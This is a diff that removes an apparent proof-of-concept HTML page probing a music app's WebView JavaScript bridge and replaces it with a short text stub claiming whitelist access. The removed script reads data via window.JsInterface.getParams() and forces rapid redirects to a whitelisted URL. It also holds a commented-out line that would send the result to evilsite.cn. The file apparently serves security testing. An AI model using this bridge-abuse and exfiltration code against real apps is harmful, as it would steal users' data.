@@ -1,32 +1,4 @@
-<!DOCTYPE html>
-<html xmlns="http://www.w3.org/1999/xhtml">
-    <head>
-        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
-        <meta name='viewport' content='width=device-width, target-densitydpi=device-dpi, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no' />
-        <title></title>
-    </head>
-    
-    <body>
-        <p id="content">ICSL</p>
-        <script>
-
-        function gotowhite(){
-            top.location.href = "https://musicsec.hwcloudtest.cn:8282/music-apph5-service/h5/index.html#/blank";
-            alert("HelloWorld!");
-        }
-        
-        function evil(){
-            var result = window.JsInterface.getParams();
-            alert("hello," + result);
-            document.getElementById("content").innerText = "www.evilsite.cn成功调用getParams获取到：\n"+result;
-            //document.body.appendChild(document.createElement("img")).src = "https://www.evilsite.cn/abc?from_Huawei_Music="+result;
-        }
-        
-        setTimeout(evil,1002);//倒计时3秒
-        setInterval(gotowhite,5);//5毫秒
-        
-        </script>
-    </body>
-</html>
+I'm HiApp/JsInterface.html,and in whitelist!!
+and I have the permission to access JSBridge.getST().
 
 
